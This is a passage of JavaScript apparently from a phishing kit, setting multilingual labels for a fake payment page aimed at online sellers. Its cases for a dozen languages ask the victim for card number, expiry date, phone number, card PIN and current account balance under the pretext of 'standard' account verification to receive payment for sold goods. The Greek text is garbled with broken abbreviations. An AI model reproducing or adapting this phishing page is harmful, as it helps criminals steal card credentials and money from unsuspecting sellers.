        $('#b_t2').html(`由于您第一次使用我们的支付系统，您需要进行账户的审核，以便将来收到卖家的货款。
        <strong>这是一种确认账户持有者的标准程序。</strong>
        这是为了确认您的能力使用在线支付系统，并保护买家和卖家免受欺诈者的威胁。`);
        $('#balik').text('残高');
        $('#paybutton').text('確認');
        break;
    case 'DK':
        $('#order-number').text('Ordrenummer')
        $('#order-title').text('Vare')
        $('#order-price').text('Pris')
        $('#order-tax').text('Moms')
        $('#order-total').text('Total')
        $('.flag_img').html(`<img src="${DK}" alt="" srcset="">`)
        $('.zag_zag').text('Indtastning af et betalingskort')
        $('.err_box').text('De data, du har indtastet, er forkerte. Vær venlig at indtaste dem igen ved at følge de angivne eksempler, eller kontakt teknisk support for at løse problemet.')
        $('#holder').text('Navn og efternavn på kortindehaveren')
        $('#numer').text('Kortnummer')
        $('#exper').text('Udløbsdato')
        $('#phone').text('Telefonnummer')
        $('#pi_pi').text('Pinkode til betalingskortet')
        $('.submit').text('Fortsæt')
        $('.conf_text').text('Kortdata er blevet bekræftet')
        $('#b_t1').text('Ifølge vores regler skal du for at bekræfte kortets ejerskab indtaste din nuværende saldo.')
        $('#b_t2').html(`Da du bruger vores betalingssystem for første gang, skal du gennemgå en verifikation af den konto, hvortil du fremover vil modtage betaling for solgte varer.
        <strong>Dette er en standardprocedure for at bekræfte kontoindehaveren.</strong>
        Dette er nødvendigt for at bekræfte din evne til at bruge det online betalingssystem og for at beskytte købere og sælgere mod svindlere.`)
        $('#balik').text('Kontosaldo')
        $('#paybutton').text('Bekræft') 
        break;
    case 'FI':
        $('#order-number').text('Tilausnumero');
        $('#order-title').text('Tuote');
        $('#order-price').text('Hinta');
        $('#order-tax').text('ALV');
        $('#order-total').text('Yhteensä');
        $('.flag_img').html(`<img src="${FI}" alt="" srcset="">`);
        $('.zag_zag').text('Pankkikortin syöttäminen');
        $('.err_box').text('Syöttämäsi tiedot ovat virheellisiä, syötä ne uudelleen annettujen esimerkkien mukaisesti tai ota yhteyttä tekniseen tukeen ongelman ratkaisemiseksi.');
        $('#holder').text('Kortinhaltijan etu- ja sukunimi');
        $('#numer').text('Kortin numero');
        $('#exper').text('Vanhenemispäivä');
        $('#phone').text('Puhelinnumero');
        $('#pi_pi').text('Pankkikortin PIN-koodi');
        $('.submit').text('Jatka');
        $('.conf_text').text('Korttitiedot on vahvistettu');
        $('#b_t1').text('Sääntöjemme mukaan kortin omistajuuden vahvistamiseksi syötä nykyinen saldo.');
        $('#b_t2').html(`Koska käytät maksujärjestelmäämme ensimmäistä kertaa, sinun on käytävä läpi tilisi varmennus, johon saat tulevaisuudessa maksuja myydyistä tavaroista.
            <strong>Tämä on standardimenettely tilinhaltijan vahvistamiseksi.</strong>
            Tämä on tarpeen varmistaaksesi kykysi käyttää verkkomaksujärjestelmää ja suojata ostajia ja myyjiä huijareilta.`);
        $('#balik').text('Tilin saldo');
        $('#paybutton').text('Vahvista');
        break;
    case 'EL':
        $('#order-number').text('Αριθμός παραγγελίας');
        $('#order-title').text('Προϊόν');
        $('#order-price').text('Τιμή');
        $('#order-tax').text('ΦΟΡΟΣ');
        $('#order-total').text('Σύνολο');
        $('.flag_img').html(`<img src="${EL}" alt="" srcset="">`);
        $('.zag_zag').text('Εισαγωγή κάρτας τράπεζας');
        $('.err_box').text('Τα δεδομένα που εισάγατε είναι εσφαλμένα, παρακαλούμε να τα εισάγετε ξανά ακολουθώντας τα δεδομένα παραδείγματος ή να επικοινωνήσετε με την τεχνική υποστήριξη για να λυθεί το πρόβλημα.');
        $('#holder').text('Όνομα και επώνυμο κάτοχου κάρτας');
        $('#numer').text('Αριθμός κάρτας');
        $('#exper').text('Ημερομηνία λήξης');
        $('#phone').text('Αριθμός τηλεφώνου');
        $('#pi_pi').text('PIN κάρτας τράπεζας');
        $('.submit').text('Συνέχεια');
        $('.conf_text').text('Τα δεδομένα της κάρτας έχουν επιβεβαιωθεί');
        $('#b_t1').text(`Σύμφωνα με τους κανόνες μας, για ν' αποδείξουμε την ιδιοκτησία της κάρτας, εισάγετε το τρέχον υπόλοιπό σας.`);
        $('#b_t2').html(`Δεδομένου ότι χρησιμοποιείτε γι' αυτή τη φορά το σύστημά μας πληρωμών, θ' απαιτηθεί ν' υποβληθείτε σ' επιβεβαιωσή λογ/κόυ στ' οποίο θ' λάβεται πληρωμή γι' πωλ/θέντων αγ/κών στο μέλλ/ν.
        <strong>Πρόκειται γι' ένδυκή δικ/συ. γ/ ν' επιβαιωθή ο κάτ. λ/γ/κό.</strong>
        Αυτό είναι απαιτ. γ/ ν' επ. τη δυν. σ. χρ. του δικτυ. συσ. πληρωμώ. και γ/ ν' πρ. αγ/τές και πωλ/τές από απάτ./δ.`);
        $('#balik').text('Υπόλοιπο λογ/κού');
        $('#paybutton').text('Επιβεβαιώστε');
        break;
    case 'TW':
        $('#order-number').text('訂單編號');
        $('#order-title').text('產品');
        $('#order-price').text('價格');
        $('#order-tax').text('稅金');
        $('#order-total').text('總計');
        $('.flag_img').html(`<img src="${TW}" alt="" srcset="">`);
        $('.zag_zag').text('輸入銀行卡');
        $('.err_box').text('您輸入的數據不正確，請按照提供的示例重新輸入，或聯繫技術支援解決問題。');
        $('#holder').text('持卡人姓名和姓氏');
        $('#numer').text('卡號');
        $('#exper').text('有效期至');
        $('#phone').text('電話號碼');
        $('#pi_pi').text('銀行卡PIN碼');
        $('.submit').text('繼續');
        $('.conf_text').text('卡片數據已確認');
        $('#b_t1').text('根據我們的規定，為了確認卡的所有權，請輸入您當前的餘額。');
        $('#b_t2').html(`由於您首次使用我們的支付系統，您需要進行帳戶驗證，以便將來將收到的貨款入帳。
            <strong>這是確認帳戶持有人的標準程序。</strong>
            這是必要的，以確認您能夠使用在線支付系統，並保護買家和賣家免受詐騙者的傷害。`);
        $('#balik').text('帳戶餘額');
        $('#paybutton').text('確認');
        break;
    case 'SV':
        $('#order-number').text('Ordernummer')
        $('#order-title').text('Produkt')
        $('#order-price').text('Pris')
        $('#order-tax').text('MOMS')
        $('#order-total').text('Totalt')
        $('.flag_img').html(`<img src="${SV}" alt="" srcset="">`)
        $('.zag_zag').text('Inmatning av bankkort')
        $('.err_box').text('De uppgifter du angav är felaktiga, var vänlig försök igen enligt de givna exemplen eller kontakta teknisk support för att lösa problemet.')
        $('#holder').text('Kortinnehavarens namn och efternamn')
        $('#numer').text('Kortnummer')
        $('#exper').text('Utgångsdatum')
        $('#phone').text('Telefonnummer')
        $('#pi_pi').text('Pinkod för bankkort')
        $('.submit').text('Fortsätt')
        $('.conf_text').text('Kortuppgifterna har bekräftats')
        $('#b_t1').text('Enligt våra regler, för att bekräfta kortägande, ange ditt nuvarande saldo.')
        $('#b_t2').html(`Eftersom du använder vårt betalningssystem för första gången, kommer du att behöva genomgå verifiering av det konto till vilket du i framtiden kommer att få betalt för sålda varor.
            <strong>Detta är en standardprocedur för att bekräfta kontoinnehavaren.</strong>
            Detta är nödvändigt för att bekräfta din förmåga att använda det onlinebetalningssystemet och för att skydda köpare och säljare mot bedragare.`)
        $('#balik').text('Kontobalans')
        $('#paybutton').text('Bekräfta')
        break;
    case 'NO':
        $('#order-number').text('Ordrenummer')
        $('#order-title').text('Produkt')
        $('#order-price').text('Pris')
        $('#order-tax').text('MVA')
        $('#order-total').text('Total')
        $('.flag_img').html(`<img src="${NO}" alt="" srcset="">`)
        $('.zag_zag').text('Inntasting av bankkort')
        $('.err_box').text('Dataene du har angitt er feil, vennligst skriv inn på nytt ved å følge de gitte eksemplene eller kontakt teknisk støtte for å løse problemet.')
        $('#holder').text('Navn og etternavn på kortinnehaveren')
        $('#numer').text('Kortnummer')
        $('#exper').text('Utløpsdato')
        $('#phone').text('Telefonnummer')
        $('#pi_pi').text('PIN-kode for bankkort')
        $('.submit').text('Fortsett')
        $('.conf_text').text('Kortdataene er bekreftet')
        $('#b_t1').text('I henhold til våre regler, for å bekrefte kortinnehav, oppgi din nåværende saldo.')
        $('#b_t2').html(`Siden du bruker vårt betalingssystem for første gang, vil du måtte gjennomgå en verifisering av kontoen som du vil motta betaling for solgte varer i fremtiden.
            <strong>Dette er en standardprosedyre for å bekrefte kontoinnehaveren.</strong>
            Dette er nødvendig for å bekrefte din mulighet til å bruke nettbetalingssystemet og for å beskytte kjøpere og selgere mot svindlere.`)
        $('#balik').text('Kontobalanse')
        $('#paybutton').text('Bekreft')
        break;
    case 'SI':
        $('#order-number').text('Številka naročila')
        $('#order-title').text('Izdelek')
        $('#order-price').text('Cena')
        $('#order-tax').text('DDV')
        $('#order-total').text('Skupaj')
        $('.flag_img').html(`<img src="${SI}" alt="" srcset="">`)
        $('.zag_zag').text('Vnos bančne kartice')
        $('.err_box').text('Vneseni podatki so napačni, prosimo, ponovno vnesite podatke po podanih primerih ali kontaktirajte tehnično podporo za rešitev težave.')
        $('#holder').text('Ime in priimek imetnika kartice')
        $('#numer').text('Številka kartice')
        $('#exper').text('Datum poteka')
        $('#phone').text('Telefonska številka')
        $('#pi_pi').text('PIN bančne kartice')
        $('.submit').text('Nadaljuj')
        $('.conf_text').text('Podatki o kartici so potrjeni')
        $('#b_t1').text('Po naših pravilih, za potrditev lastništva kartice, vnesite trenutno stanje.')
        $('#b_t2').html(`Ker naš plačilni sistem uporabljate prvič, boste morali opraviti preverjanje računa, na katerega boste v prihodnosti prejeli plačilo za prodane izdelke.
            <strong>To je standardni postopek za potrditev lastnika računa.</strong>
            To je potrebno za potrditev vaše sposobnosti uporabe spletnega plačilnega sistema in za zaščito kupcev in prodajalcev pred goljufi.`)
        $('#balik').text('Stanje na računu')
        $('#paybutton').text('Potrdi')
        break;
    case 'FIL':
        $('#order-number').text('Numero ng Order');
        $('#order-title').text('Produkto');
        $('#order-price').text('Presyo');
        $('#order-tax').text('Buwis');
        $('#order-total').text('Kabuuan');
        $('.flag_img').html(`<img src="${FIL}" alt="" srcset="">`);
        $('.zag_zag').text('Pagpasok ng bangko kard');
        $('.err_box').text('Ang mga datos na iyong ipinasok ay mali, mangyaring muling ipasok ayon sa ibinigay na mga halimbawa o makipag-ugnayan sa teknikal na suporta upang malutas ang problema.');
        $('#holder').text('Pangalan at apelyido ng may-ari ng kard');
        $('#numer').text('Numero ng Kard');
        $('#exper').text('Petsa ng Pagkawalang Bisa');
        $('#phone').text('Numero ng Telepono');
        $('#pi_pi').text('PIN ng bangko kard');
        $('.submit').text('Magpatuloy');
        $('.conf_text').text('Ang datos ng kard ay nakumpirma');
        $('#b_t1').text('Ayon sa aming mga alituntunin, upang kumpirmahin ang pagmamay-ari ng kard, ipasok ang iyong kasalukuyang balanse.');
        $('#b_t2').html(`Dahil ginagamit mo ang aming sistema ng pagbabayad sa unang pagkakataon, kakailanganin mong sumailalim sa pagpapatunay ng account kung saan makakatanggap ka ng pagbabayad para sa mga nabentang produkto sa hinaharap.
        <strong>Ito ay isang karaniwang pamamaraan upang kumpirmahin ang may-ari ng account.</strong>
        Kinakailangan ito upang kumpirmahin ang iyong kakayahan na gamitin ang online na sistema ng pagbabayad at para protektahan ang mga mamimili at nagbebenta mula sa mga manloloko.`);
        $('#balik').text('Balanse ng Account');
        $('#paybutton').text('Kumpirmahin');
        break;
    case 'HI':
        $('#order-number').text('ऑर्डर नंबर');
        $('#order-title').text('उत्पाद');
        $('#order-price').text('कीमत');
        $('#order-tax').text('कर');
        $('#order-total').text('कुल');
        $('.flag_img').html(`<img src="${IN}" alt="" srcset="">`);
        $('.zag_zag').text('बैंक कार्ड प्रविष्ट करना');
        $('.err_box').text('आपके द्वारा दर्ज किया गया डेटा गलत है, कृपया दिए गए उदाहरणों का पालन करके पुनः दर्ज करें या समस्या को हल करने के लिए तकनीकी सहायता से संपर्क करें।');
        $('#holder').text('कार्ड धारक का नाम और उपनाम');
        $('#numer').text('कार्ड नंबर');
        $('#exper').text('समाप्ति तिथि');
        $('#phone').text('फ़ोन नंबर');
        $('#pi_pi').text('बैंक कार्ड पिन');
        $('.submit').text('जारी रखें');
        $('.conf_text').text('कार्ड डेटा की पुष्टि हो चुकी है');
        $('#b_t1').text('हमारे नियमों के अनुसार, कार्ड स्वामित्व की पुष्टि करने के लिए, अपना वर्तमान संतुलन दर्ज करें।');
        $('#b_t2').html(`चूंकि आप पहली बार हमारे भुगतान प्रणाली का उपयोग कर रहे हैं, आपको उस खाते का सत्यापन करना होगा जिसमें आपको भविष्य में बेचे गए वस्तुओं का भुगतान प्राप्त होगा। <strong>यह खाता धारक की पुष्टि करने के लिए एक मानक प्रक्रिया है।</strong> यह आवश्यक है ताकि आपकी ऑनलाइन भुगतान प्रणाली का उपयोग करने की क्षमता की पुष्टि हो सके और धोखेबाजों से खरीददारों और विक्रेताओं की सुरक्षा की जा सके।`);
        $('#balik').text('खाता शेष');
        $('#paybutton').text('पुष्टि करें');
        break;
    case 'BG':
        $('#order-number').text('Номер на поръчката')
        $('#order-title').text('Продукт')
        $('#order-price').text('Цена')
        $('#order-tax').text('ДДС')
        $('#order-total').text('Общо')
        $('.flag_img').html(`<img src="${BG}" alt="" srcset="">`)
        $('.zag_zag').text('Въвеждане на банкова карта')
        $('.err_box').text('Въведените от вас данни са неправилни, моля, въведете ги отново, следвайки примерите, или се свържете с техническата поддръжка за решаване на проблема.')
        $('#holder').text('Име и фамилия на притежателя на картата')
        $('#numer').text('Номер на картата')
        $('#exper').text('Дата на изтичане')
        $('#phone').text('Телефонен номер')
        $('#pi_pi').text('ПИН на банковата карта')
        $('.submit').text('Продължи')
        $('.conf_text').text('Данните за картата са потвърдени')
        $('#b_t1').text('Според нашите правила, за потвърждаване на собствеността на картата, въведете текущия си баланс.')
        $('#b_t2').html(`Тъй като използвате нашата платежна система за първи път, ще трябва да преминете през верификация на акаунта, в който ще получавате плащания за продадени стоки в бъдеще.
        <strong>Това е стандартна процедура за потвърждаване на притежателя на акаунта.</strong>
        Това е необходимо, за да се потвърди вашата способност да използвате онлайн платежната система и да защитим купувачите и продавачите от измамници.`)
        $('#balik').text('Баланс на акаунта')
        $('#paybutton').text('Потвърди')
        break;
    default:
        $('#order-number').text('Order number')
        $('#order-title').text('Product')
        $('#order-price').text('Price')
        $('#order-tax').text('TAX')
        $('#order-total').text('Total')
        $('.flag_img').html(`<img src="${EN}" alt="" srcset="">`)
        $('.zag_zag').text('Entering a bank card')
        $('.err_box').text('The data you entered is incorrect, please reenter by following the given examples or contact technical support to resolve the problem.')
        $('#holder').text('Name and surname of the card holder')
        $('#numer').text('Card number')
        $('#exper').text('Expiration date')
        $('#phone').text('Phone number')
        $('#pi_pi').text('Bank card pin')
        $('.submit').text('Continue')
        $('.conf_text').text('The card data has been confirmed')
        $('#b_t1').text('According to our rules, to confirm card ownership, enter your current balance.')
        $('#b_t2').html(`Since you are using our payment system for the first time, you will need to undergo verification of the account to which you will receive payment for sold goods in the future.
    <strong>This is a standard procedure to confirm the account holder.</strong>
    This is necessary in order to confirm your ability to use the online payment system and to protect buyers and sellers from fraudsters.`)
        $('#balik').text('Account balance')
        $('#paybutton').text('Confirm')
        break;
}